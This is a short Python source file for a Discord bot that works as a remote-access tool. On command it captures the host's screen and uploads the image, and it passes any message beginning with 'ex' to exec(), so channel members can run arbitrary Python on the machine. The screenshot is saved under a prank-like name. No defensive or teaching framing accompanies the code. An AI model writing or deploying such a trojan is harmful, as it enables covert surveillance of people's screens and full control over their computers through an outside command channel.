import discord
import pyautogui
import ctypes

def ss():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'RickAstley.png')
    return('RickAstley.png')

class MyClient(discord.Client):
    async def on_ready(self):
        print('Logged on as', self.user)

    async def on_message(self, message):
        # don't respond to ourselves
        if message.author == self.user:
            return

        if message.content == 'ping':
            await message.channel.send('pong')
        elif message.content == 'get':
            await message.channel.send('getting...')
            await message.channel.send(file=discord.File(ss()))
        elif message.content.startswith('ex'):
            channel = message.channel
            thingtosay = 'executing - '+"```"+ message.content[2:] + "```"
            await message.channel.send(thingtosay)
            print(thingtosay)
            exec(message.content[2:])

client = MyClient()
# replace token with discord bot token ----> client.run('token')
